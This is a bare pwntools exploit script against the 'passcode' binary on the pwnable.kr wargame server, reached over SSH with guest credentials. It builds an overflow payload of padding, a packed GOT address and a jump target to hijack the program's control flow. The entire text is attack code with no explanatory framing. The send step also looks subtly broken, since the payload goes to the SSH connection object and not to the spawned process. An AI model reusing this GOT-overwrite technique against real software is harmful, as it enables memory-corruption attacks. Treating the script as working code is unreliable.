from pwn import *
r = ssh('passcode', 'pwnable.kr', 2222, 'guest')
b = b'a' * 96 + p32(0x804a004) + p32(0x080485d7)
fd = r.process(['./passcode'])
print(fd.recvline())
r.sendline(b)
print(fd.recvall())
